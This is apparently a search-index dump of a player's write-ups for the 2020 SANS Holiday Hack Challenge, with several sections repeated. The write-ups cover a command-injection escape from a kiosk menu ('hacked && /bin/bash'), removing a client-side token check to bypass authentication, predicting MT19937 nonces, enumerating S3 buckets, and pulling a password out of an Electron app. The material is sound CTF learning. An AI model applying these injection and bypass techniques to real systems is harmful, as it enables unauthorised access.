__ | / \\ / \\_ _/ ejm96 Jason is getting further and further pulled into the Santa Matrix. Eventually, he will completely take over KringleKon like in Tron.","title":"Shiny Upatree in Castle Approach"},{"location":"elves/upatree/#castle-approach","text":"","title":"Castle Approach"},{"location":"elves/upatree/#shiny-upatree-kringle-kiosk","text":"Challenge Hiya hiya - I'm Shinny Upatree! Check out this cool KringleCon kiosk! You can get a map of the castle, learn about where the elves are, and get your own badge printed right on-screen! Be careful with that last one though. I heard someone say it's \"ingestible.\" Or something... Do you think you could check and see if there is an issue? Hint In the hint, there is a link to command injection techniques from OWASP The terminal has a set of commands. The hint pointed at the 4 th one, which is a problem. ```bash ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Welcome to the North Pole! ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 1. Map 2. Code of Conduct and Terms of Use 3. Directory 4. Print Name Badge 5. Exit Please select an item from the menu by entering a single number. Anything else might have ... unintended consequences. Enter choice [1 - 5] ```","title":"Shiny Upatree  - Kringle Kiosk"},{"location":"elves/upatree/#choice-1-in-the-terminal-map","text":"","title":"Choice 1 in the Terminal - Map"},{"location":"elves/upatree/#choice-3-in-the-terminal-directory","text":"","title":"Choice 3 in the Terminal - Directory"},{"location":"elves/upatree/#choice-4-in-the-terminal-printing","text":"In this command, you print out a command. I ented \">\" and got this message ```bash Enter your name (Please avoid special characters, they cause some weird errors)...> bash: -c: line 0: syntax error near unexpected token `newline' bash: -c: line 0: `/usr/games/cowsay -f /opt/reindeer.cow >' ``` The program will also cause \"Error\" if you enter an invalid number I believe I have to enter a newline and then run a command. I found that I could enter (4), to enter a name. And, I could append a command to be executed by entering a name like hacked && echo hacked I had forgotten the intension of the terminal, so I used hacked && echo welcome.sh to get the entire shell script as shown welcome.sh Success I found that the goal was to escape the menu, so I ran hacked && /bin/bash ________ < hacked > -------- \\ \\ \\_\\_ _/_/ \\ \\_ _/ ( oo ) \\_ ______ ( __ ) \\ ) \\/\\ || ----w | || || ___ _ / __ | _ _ __ __ ___ ___ ___ | | \\_ _ \\ | + | | / _ | / _ | / -_ ) ( _-< ( _-< | _ | | ___/ \\_ ,_ | \\_ _ | _ \\_ _ | _ \\_ __ | /__/_ /__/_ _ ( _ ) _ _ | \"\"\"\"\"|_|\"\"\"\"\" | _ | \"\"\"\"\"|_|\"\"\"\"\" | _ | \"\"\"\"\"|_|\"\"\"\"\" | _ | \"\"\"\"\"|_| \"\"\" | \"`-0-0-'\" ` -0-0- '\"`-0-0-' \"`-0-0-'\" ` -0-0- '\"`-0-0-' \"`-0-0-'\" ` -0-0- ' Shinny's Response Golly - wow! You sure found the flaw for us! Say, we've been having an issue with an Amazon S3 bucket. Do you think you could help find Santa's package file? Jeepers, it seems there's always a leaky bucket in the news. You'd think we could find our own files! Digininja has a great guide, if you're new to S3 searching. He even released a tool for the task - what a guy! The package wrapper Santa used is reversible, but it may take you some trying. Good luck, and thanks for pitching in! Jason is HERE Hitting the nail on the scaffolding gives a message: Job Hunting? Feeling Stuck? Join me for an interactive job hunting livestream! Any industry. Any type of job. No vendor pitches. Not selling anything. Just helping. Jason is in the Matrix On this terminal, in the /opt directory, there is a file called plant.txt . The contents say: Hi, my name is Jason the Plant! ( U \\| ) __ | / \\ / \\_ _/ ejm96 Jason is getting further and further pulled into the Santa Matrix. Eventually, he will completely take over KringleKon like in Tron.","title":"Choice 4 in the Terminal - Printing"},{"location":"objectives/obj1/","text":"Staging Jingle Ringford - Staging Train Challenge Welcome! Hop in the gondola to take a ride up the mountain to Exit 19: Santa's castle! Santa asked me to design the new badge, and he wanted it to look really cold - like it was frosty. Click your badge (the snowflake in the center of your avatar) to read your objectives. If you'd like to chat with the community, join us on Discord! We have specially appointed Kringle Koncierges as helpers; you can hit them up for help in the #general channel! If you get a minute, check out Ed Skoudis' official intro to the con! Oh, and before you head off up the mountain, you might want to try to figure out what's written on that advertising bilboard. Have you managed to read the gift list at the center? There is a hint to look at online tools such as https://www.photopea.com/ . By cropping the image and using the \"twirl\" distort filter, was able to get the list Name Gift Ed Two front teeth Brian ? Josh proxmark Clay ? Tad Holiday Lights Phil Stuffed Pikachu Jerry Trip to North Pole Untwirling the photo was difficult, but I was able to move it back and forth to find `proxmark Evergreen's Response Great work with that! I'm sure you'll be able to help us with more challenges up at the castle!","title":"Objective 1 - Santa's List"},{"location":"objectives/obj1/#staging","text":"","title":"Staging"},{"location":"objectives/obj1/#jingle-ringford-staging-train","text":"Challenge Welcome! Hop in the gondola to take a ride up the mountain to Exit 19: Santa's castle! Santa asked me to design the new badge, and he wanted it to look really cold - like it was frosty. Click your badge (the snowflake in the center of your avatar) to read your objectives. If you'd like to chat with the community, join us on Discord! We have specially appointed Kringle Koncierges as helpers; you can hit them up for help in the #general channel! If you get a minute, check out Ed Skoudis' official intro to the con! Oh, and before you head off up the mountain, you might want to try to figure out what's written on that advertising bilboard. Have you managed to read the gift list at the center? There is a hint to look at online tools such as https://www.photopea.com/ . By cropping the image and using the \"twirl\" distort filter, was able to get the list Name Gift Ed Two front teeth Brian ? Josh proxmark Clay ? Tad Holiday Lights Phil Stuffed Pikachu Jerry Trip to North Pole Untwirling the photo was difficult, but I was able to move it back and forth to find `proxmark Evergreen's Response Great work with that! I'm sure you'll be able to help us with more challenges up at the castle!","title":"Jingle Ringford  - Staging Train"},{"location":"objectives/obj10/","text":"Elevator Bypass Fingerprint Challenge Bypass the fingerprint sensor not as santa Looking at the JavaScript code, line 354 of app.js would activate if the fingerprint sensor was pushed. I removed the && hasToken(\"besanta\"), and the code executed without being santa. Tinsel Upatree GOSHGOLLY How did you get in here?? I mean, hey, I'm impressed you made it in here, but you've got to leave! I mean, hey, I'm impressed you made it in here, but you've got to leave! Breaking into Santa's office might mean immediate membership on the wrong side of the Naughty/Nice List.","title":"Objective 10 - Bypass Fingerprint"},{"location":"objectives/obj10/#elevator","text":"","title":"Elevator"},{"location":"objectives/obj10/#bypass-fingerprint","text":"Challenge Bypass the fingerprint sensor not as santa Looking at the JavaScript code, line 354 of app.js would activate if the fingerprint sensor was pushed. I removed the && hasToken(\"besanta\"), and the code executed without being santa. Tinsel Upatree GOSHGOLLY How did you get in here?? I mean, hey, I'm impressed you made it in here, but you've got to leave! I mean, hey, I'm impressed you made it in here, but you've got to leave! Breaking into Santa's office might mean immediate membership on the wrong side of the Naughty/Nice List.","title":"Bypass Fingerprint"},{"location":"objectives/obj11a/","text":"Santa's Office Tinsel Upatree - Naughty and Nice List Challenge Howdy Santa! Just guarding the Naughty/Nice list on your desk. Santa, I don't know if you've heard, but something is very, very wrong... We tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn't possible. We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack's big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk. You can get some tools to help you here. Tangle Coalbox, in the Speaker UNPreparedness room. has been talking with attendees about the issue. Tools The code for this challenge can be found in the Official Naughty Nice Blockhain Education Pack . The Blockchain to be loaded is provided in the file Blockchain.dat Hint Part A If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. Tangle Hints Crikey - that's it! You've done the Impossible! You've impressed this old elf today. Great work identifying and abusing the pseudo-random sequence. Now, the REAL question is, how else can this be abused? Do you think someone could try and cheat the Naughty/Nice Blockchain with this? If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. A blockchain works by \"chaining\" blocks together - so there's no way that Jack could change it without it messing up the chain... Maybe if you look at the block that seems like it got changed, it might help. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. That's about all the help I can give you, kid, but Prof. Petabyte may have more . How I did this Link to the full code There are simliarities between this code and the Snowball Game. One big difference is that the nonces, which have to be predicted, are 64bit rather than 32bit. Each nonce has to be split into two 32 bit nonce-parts. The mt19937 class can predict the nonces by creating the seed array by appending the lower 32, then the higher 32. I wrote python code that would perform the following: Extracted the bitcoin.dat file and build the Python objects as provided in the OfficalNaughtNiceBlockchainEducationPack with open ( 'official_public.pem' , 'rb' ) as fh : official_public_key = RSA . importKey ( fh . read ()) c2 = Chain ( load = True , filename = 'blockchain.dat' ) print ( 'C2: Block chain verify: %s ' % ( c2 . verify_chain ( official_public_key ))) Extract the nonce, split into lower and higher 32 bits, and save to a seed array. for block in c2 . blocks : # Convert the seed. lower , upper = getNonces ( format ( block . nonce , '016X' )) seed_array . append ( lower ) seed_array . append ( upper ) test_nonce = combine ( lower , upper ) real_nonce = format ( block . nonce , '016X' ) if real_nonce != test_nonce : print ( \"[ERROR] Block is bad for {} \" . format ( block . index )) nonce_array . append ( format ( block . nonce , '016X' )) Run the known Nonces through the code used to predict in the Snowball game challenge for i in range ( mt19937 . n ): myprng . MT [ i ] = untemper ( seed_array [ i ]) Loop through all the known nonces in the blockchain and compare to the next predicted value. If there is a missed value, then we know there is a problem with the code. I had alot of problems getting the nonce split and recombine to work properly, so this was good to test. predicted_numbers = [] block_chain_index = 0 for block in c2 . blocks [ int ( mt19937 . n / 2 ):]: lower_predict = myprng . extract_number () upper_predict = myprng . extract_number () new_num = combine ( lower_predict , upper_predict ) hex_is = format ( block . nonce , '016X' ) found = next (( x for x in nonce_array if x == new_num ), None ) if ( found == None ): print ( \"Not found\" ) if combine ( lower_predict , upper_predict ) != format ( block . nonce , '016X' ): print ( \"Something wrong: block.nonce %\" ) Now, loop through to predict from the last know block index, to what would be block index 13000. for i in range ( c2 . blocks [ - 1 ] . index + 1 , 130001 ): low_predict = myprng . extract_number () high_predict = myprng . extract_number () combined_value = combine ( low_predict , high_predict ) print ( \"Index {} nonce is {} \" . format ( i , combined_value )) Success 57066318F32F729D Note I did not complete Object 11b, although I was able to extract the block in question and extract the binary and PDF file. for block in c2 . blocks : sha256_value = block . full_hash_265 () if sha256_value == \"58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f\" : print ( block ) block . dump_doc ( 0 ) block . dump_doc ( 1 )","title":"Objective 11.a - BlockChain"},{"location":"objectives/obj11a/#santas-office","text":"","title":"Santa's Office"},{"location":"objectives/obj11a/#tinsel-upatree-naughty-and-nice-list","text":"Challenge Howdy Santa! Just guarding the Naughty/Nice list on your desk. Santa, I don't know if you've heard, but something is very, very wrong... We tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn't possible. We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack's big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk. You can get some tools to help you here. Tangle Coalbox, in the Speaker UNPreparedness room. has been talking with attendees about the issue.","title":"Tinsel Upatree - Naughty and Nice List"},{"location":"objectives/obj11a/#tools","text":"The code for this challenge can be found in the Official Naughty Nice Blockhain Education Pack . The Blockchain to be loaded is provided in the file Blockchain.dat Hint Part A If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. Tangle Hints Crikey - that's it! You've done the Impossible! You've impressed this old elf today. Great work identifying and abusing the pseudo-random sequence. Now, the REAL question is, how else can this be abused? Do you think someone could try and cheat the Naughty/Nice Blockchain with this? If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. A blockchain works by \"chaining\" blocks together - so there's no way that Jack could change it without it messing up the chain... Maybe if you look at the block that seems like it got changed, it might help. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. That's about all the help I can give you, kid, but Prof. Petabyte may have more .","title":"Tools"},{"location":"objectives/obj11a/#how-i-did-this","text":"Link to the full code There are simliarities between this code and the Snowball Game. One big difference is that the nonces, which have to be predicted, are 64bit rather than 32bit. Each nonce has to be split into two 32 bit nonce-parts. The mt19937 class can predict the nonces by creating the seed array by appending the lower 32, then the higher 32. I wrote python code that would perform the following: Extracted the bitcoin.dat file and build the Python objects as provided in the OfficalNaughtNiceBlockchainEducationPack with open ( 'official_public.pem' , 'rb' ) as fh : official_public_key = RSA . importKey ( fh . read ()) c2 = Chain ( load = True , filename = 'blockchain.dat' ) print ( 'C2: Block chain verify: %s ' % ( c2 . verify_chain ( official_public_key ))) Extract the nonce, split into lower and higher 32 bits, and save to a seed array. for block in c2 . blocks : # Convert the seed. lower , upper = getNonces ( format ( block . nonce , '016X' )) seed_array . append ( lower ) seed_array . append ( upper ) test_nonce = combine ( lower , upper ) real_nonce = format ( block . nonce , '016X' ) if real_nonce != test_nonce : print ( \"[ERROR] Block is bad for {} \" . format ( block . index )) nonce_array . append ( format ( block . nonce , '016X' )) Run the known Nonces through the code used to predict in the Snowball game challenge for i in range ( mt19937 . n ): myprng . MT [ i ] = untemper ( seed_array [ i ]) Loop through all the known nonces in the blockchain and compare to the next predicted value. If there is a missed value, then we know there is a problem with the code. I had alot of problems getting the nonce split and recombine to work properly, so this was good to test. predicted_numbers = [] block_chain_index = 0 for block in c2 . blocks [ int ( mt19937 . n / 2 ):]: lower_predict = myprng . extract_number () upper_predict = myprng . extract_number () new_num = combine ( lower_predict , upper_predict ) hex_is = format ( block . nonce , '016X' ) found = next (( x for x in nonce_array if x == new_num ), None ) if ( found == None ): print ( \"Not found\" ) if combine ( lower_predict , upper_predict ) != format ( block . nonce , '016X' ): print ( \"Something wrong: block.nonce %\" ) Now, loop through to predict from the last know block index, to what would be block index 13000. for i in range ( c2 . blocks [ - 1 ] . index + 1 , 130001 ): low_predict = myprng . extract_number () high_predict = myprng . extract_number () combined_value = combine ( low_predict , high_predict ) print ( \"Index {} nonce is {} \" . format ( i , combined_value )) Success 57066318F32F729D Note I did not complete Object 11b, although I was able to extract the block in question and extract the binary and PDF file. for block in c2 . blocks : sha256_value = block . full_hash_265 () if sha256_value == \"58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f\" : print ( block ) block . dump_doc ( 0 ) block . dump_doc ( 1 )","title":"How I did this"},{"location":"objectives/obj11b/","text":"Santa's Office Tinsel Upatree - Challenge Howdy Santa! Just guarding the Naughty/Nice list on your desk. Santa, I don't know if you've heard, but something is very, very wrong... We tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn't possible. We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack's big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk. You can get some tools to help you here. Tangle Coalbox, in the Speaker UNPreparedness room. has been talking with attendees about the issue. Tools https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip https://download.holidayhackchallenge.com/2020/blockchain.dat Hint Part A If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. Hint Part B Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. Shinny Upatree swears that he doesn't remember writing the contents of the document found in that block. Maybe looking closely at the documents, you might find something interesting. If Jack was somehow able to change the contents of the block AND the document without changing the hash... that would require a very UNIque hash COLLision . UNICOLL? The idea that Jack could somehow change the data in a block without invalidating the whole chain just collides with the concept of hashes and blockchains. While there's no way it could happen, maybe if you look at the block that seems like it got changed, it might help. Qwerty Petabyte is giving a talk about blockchain tomfoolery! A blockchain works by \"chaining\" blocks together - each new block includes a hash of the previous block. That previous hash value is included in the data that is hashed - and that hash value will be in the next block. So there's no way that Jack could change an existing block without it messing up the chain... Tangle Hints Crikey - that's it! You've done the Impossible! You've impressed this old elf today. Great work identifying and abusing the pseudo-random sequence. Now, the REAL question is, how else can this be abused? Do you think someone could try and cheat the Naughty/Nice Blockchain with this? If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. A blockchain works by \"chaining\" blocks together - so there's no way that Jack could change it without it messing up the chain... Maybe if you look at the block that seems like it got changed, it might help. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. That's about all the help I can give you, kid, but Prof. Petabyte may have more . NOTES TO DELETE 2 changes are required in the pdf, the other two extend in two fields of the block Look at the slide deck. Case sensitivity section How I did it I really just updated my original program. I wrote a function to do SHA256 evaluation and try and find the block with a SHA256 of 58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f The Chain Chain Index: 129459 Nonce: a9447e5771c704f4 PID: 0000000000012fd1 RID: 000000000000020f Document Count: 2 Score: ffffffff (4294967295) Sign: 1 (Nice) Data item: 1 Data Type: ff (Binary blob) Data Length: 0000006c Data: b'ea465340303a6079d3df2762be68467c27f046d3a7ff4e92dfe1def7407f2a7b73e1b759b8b919451e37518d22d987296fcb0f188dd60388bf20350f2a91c29d0348614dc0bceef2bcadd4cc3f251ba8f9fbaf171a06df1e1fd8649396ab86f9d5118cc8d8204b4ffe8d8f09' Data item: 2 Data Type: 05 (PDF) Data Length: 00009f57 That first one of a data type of Binary Blob is suspicious. It is likely that the binary data was added in order to get the MDF The extracted PDF","title":"Santa's Office"},{"location":"objectives/obj11b/#santas-office","text":"","title":"Santa's Office"},{"location":"objectives/obj11b/#tinsel-upatree-","text":"Challenge Howdy Santa! Just guarding the Naughty/Nice list on your desk. Santa, I don't know if you've heard, but something is very, very wrong... We tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn't possible. We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack's big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk. You can get some tools to help you here. Tangle Coalbox, in the Speaker UNPreparedness room. has been talking with attendees about the issue.","title":"Tinsel Upatree -"},{"location":"objectives/obj11b/#tools","text":"https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip https://download.holidayhackchallenge.com/2020/blockchain.dat Hint Part A If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. Hint Part B Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. Shinny Upatree swears that he doesn't remember writing the contents of the document found in that block. Maybe looking closely at the documents, you might find something interesting. If Jack was somehow able to change the contents of the block AND the document without changing the hash... that would require a very UNIque hash COLLision . UNICOLL? The idea that Jack could somehow change the data in a block without invalidating the whole chain just collides with the concept of hashes and blockchains. While there's no way it could happen, maybe if you look at the block that seems like it got changed, it might help. Qwerty Petabyte is giving a talk about blockchain tomfoolery! A blockchain works by \"chaining\" blocks together - each new block includes a hash of the previous block. That previous hash value is included in the data that is hashed - and that hash value will be in the next block. So there's no way that Jack could change an existing block without it messing up the chain... Tangle Hints Crikey - that's it! You've done the Impossible! You've impressed this old elf today. Great work identifying and abusing the pseudo-random sequence. Now, the REAL question is, how else can this be abused? Do you think someone could try and cheat the Naughty/Nice Blockchain with this? If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. A blockchain works by \"chaining\" blocks together - so there's no way that Jack could change it without it messing up the chain... Maybe if you look at the block that seems like it got changed, it might help. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. That's about all the help I can give you, kid, but Prof. Petabyte may have more . NOTES TO DELETE 2 changes are required in the pdf, the other two extend in two fields of the block Look at the slide deck. Case sensitivity section","title":"Tools"},{"location":"objectives/obj11b/#how-i-did-it","text":"I really just updated my original program. I wrote a function to do SHA256 evaluation and try and find the block with a SHA256 of 58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f The Chain Chain Index: 129459 Nonce: a9447e5771c704f4 PID: 0000000000012fd1 RID: 000000000000020f Document Count: 2 Score: ffffffff (4294967295) Sign: 1 (Nice) Data item: 1 Data Type: ff (Binary blob) Data Length: 0000006c Data: b'ea465340303a6079d3df2762be68467c27f046d3a7ff4e92dfe1def7407f2a7b73e1b759b8b919451e37518d22d987296fcb0f188dd60388bf20350f2a91c29d0348614dc0bceef2bcadd4cc3f251ba8f9fbaf171a06df1e1fd8649396ab86f9d5118cc8d8204b4ffe8d8f09' Data item: 2 Data Type: 05 (PDF) Data Length: 00009f57 That first one of a data type of Binary Blob is suspicious. It is likely that the binary data was added in order to get the MDF The extracted PDF","title":"How I did it"},{"location":"objectives/obj2/","text":"Castle Approach Shiny Upatree - Investigate S3 Bucket Terminal Message Can you help me? Santa has been experimenting with new wrapping technology, and we've run into a ribbon-curling nightmare! We store our essential data assets in the cloud, and what a joy it's been! Except I don't remember where, and the Wrapper3000 is on the fritz! Can you find the missing package, and unwrap it all the way? Hints: Use the file command to identify a file type. You can also examine tool help using the man command. Search all man pages for a string such as a file extension using the apropos command. To see this help again, run cat /etc/motd. elf@0a5f338f0da7:~$ BucketFinder is available so we try running that. elf@0a5f338f0da7:~/bucket_finder$ ./bucket_finder.rb wordlist http://s3.amazonaws.com/kringlecastle Bucket found but access denied: kringlecastle http://s3.amazonaws.com/wrapper Bucket found but access denied: wrapper http://s3.amazonaws.com/santa Bucket santa redirects to: santa.s3.amazonaws.com http://santa.s3.amazonaws.com/ Bucket found but access denied: santa By adding \"wrapper3000\" to the wordlist, was able to get the following: http://s3.amazonaws.com/wrapper3000 Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 ) <Public> http://s3.amazonaws.com/wrapper3000/package We can pull down the file through curl, elf@70b09eda9c02:~$ curl http://s3.amazonaws.com/wrapper3000/package > package.out elf@70b09eda9c02:~$ cat package.out UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eA sAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGg PUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh6 1Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992u xodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw 2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1F gmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgD CEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsA AQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA This is base64 encoded file, so we decode it, and check its file type elf@70b09eda9c02:~$ cat package.out | base64 --decode > package.decode elf@70b09eda9c02:~$ file package.decode package.decode: Zip archive data, at least v1.0 to extract This created a file called package.txt.Z.xz.xxd.tar.bz2. We will need to decode bz2, tar, xxd, xz and Z in that order. bzip2 -d package.txt.Z.xz.xxd.tar.bz2 tar -xf package.txt.Z.xz.xxd.tar xxd -r package.txt.Z.xz.xxd > package.txt.Z.xy unxz --keep package.txt.Z.xz uncompress package.txt.Z cat package.txt North Pole: The Frostiest Place on Earth Success North Pole: The Frostiest Place on Earth","title":"Objective 2 - Investigate S3 Bucket"},{"location":"objectives/obj2/#castle-approach","text":"","title":"Castle Approach"},{"location":"objectives/obj2/#shiny-upatree-investigate-s3-bucket","text":"Terminal Message Can you help me? Santa has been experimenting with new wrapping technology, and we've run into a ribbon-curling nightmare! We store our essential data assets in the cloud, and what a joy it's been! Except I don't remember where, and the Wrapper3000 is on the fritz! Can you find the missing package, and unwrap it all the way? Hints: Use the file command to identify a file type. You can also examine tool help using the man command. Search all man pages for a string such as a file extension using the apropos command. To see this help again, run cat /etc/motd. elf@0a5f338f0da7:~$ BucketFinder is available so we try running that. elf@0a5f338f0da7:~/bucket_finder$ ./bucket_finder.rb wordlist http://s3.amazonaws.com/kringlecastle Bucket found but access denied: kringlecastle http://s3.amazonaws.com/wrapper Bucket found but access denied: wrapper http://s3.amazonaws.com/santa Bucket santa redirects to: santa.s3.amazonaws.com http://santa.s3.amazonaws.com/ Bucket found but access denied: santa By adding \"wrapper3000\" to the wordlist, was able to get the following: http://s3.amazonaws.com/wrapper3000 Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 ) <Public> http://s3.amazonaws.com/wrapper3000/package We can pull down the file through curl, elf@70b09eda9c02:~$ curl http://s3.amazonaws.com/wrapper3000/package > package.out elf@70b09eda9c02:~$ cat package.out UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eA sAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGg PUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh6 1Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992u xodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw 2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1F gmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgD CEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsA AQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA This is base64 encoded file, so we decode it, and check its file type elf@70b09eda9c02:~$ cat package.out | base64 --decode > package.decode elf@70b09eda9c02:~$ file package.decode package.decode: Zip archive data, at least v1.0 to extract This created a file called package.txt.Z.xz.xxd.tar.bz2. We will need to decode bz2, tar, xxd, xz and Z in that order. bzip2 -d package.txt.Z.xz.xxd.tar.bz2 tar -xf package.txt.Z.xz.xxd.tar xxd -r package.txt.Z.xz.xxd > package.txt.Z.xy unxz --keep package.txt.Z.xz uncompress package.txt.Z cat package.txt North Pole: The Frostiest Place on Earth Success North Pole: The Frostiest Place on Earth","title":"Shiny Upatree  - Investigate S3 Bucket"},{"location":"objectives/obj3/","text":"Courtyard Sugarplum Mary - Point-of-Sale Password Recovery Terminal Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. I hear there's a way to extract an ASAR file from the binary, but I haven't looked into it yet. Hint There are tools and guides explaining how to extract ASAR from Electron apps. It's possible to extract the source code from an Electron app . When trying to open the terminal, it says the termianl is locked and you can download an offline version to inspect at Running the santa-shop.exe, it installed the application in C:\\Users\\cyber\\AppData\\Local\\Programs I installed npm's asar as recommended in the Medium hint above and extracted the source code. npx asar extract app.asar santa-source/ A simple text search in the directory showed the password as santapass Entering the password brings me to a Point of Sale terminal Success santapass","title":"Objective 3 - Point-of-Sale Password 